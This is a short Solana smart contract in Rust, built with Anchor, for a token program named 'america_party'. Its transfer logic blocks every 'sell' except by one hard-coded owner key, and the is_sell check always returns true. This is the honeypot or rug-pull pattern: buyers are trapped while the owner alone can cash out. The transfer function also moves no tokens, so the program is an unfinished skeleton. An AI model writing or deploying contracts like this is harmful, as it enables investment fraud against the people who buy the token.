use anchor_lang::prelude::*;
use std::str::FromStr;

declare_id!("Fg6PaFpoGXkYsidMpWTK6W2BeZ7FEfcYkgMQUGp1uZJ");

#[program]
pub mod america_party {
    use super::*;

    pub fn transfer(ctx: Context<Transfer>, _amount: u64) -> Result<()> {
        let sender = ctx.accounts.sender.key();
        let to = ctx.accounts.to.key();

        let owner = Pubkey::from_str("8p7sj2T3dY44D2uVTD2x5oah4QDw1JkvzjqnPUKBmUe5")
            .expect("Invalid owner pubkey");

        if is_sell(to) && sender != owner {
            return Err(error!(ErrorCode::SellingNotAllowed));
        }

        Ok(())
    }
}

fn is_sell(_to: Pubkey) -> bool {
    // لاحقًا ممكن نتحقق من عنوان DEX معين
    true
}

#[derive(Accounts)]
pub struct Transfer<'info> {
    #[account(mut)]
    pub sender: Signer<'info>,
    /// CHECK: can be any account (DEX, wallet, etc.)
    pub to: AccountInfo<'info>,
}

#[error_code]
pub enum ErrorCode {
    #[msg("Selling is disabled for everyone except the owner.")]
    SellingNotAllowed,
}
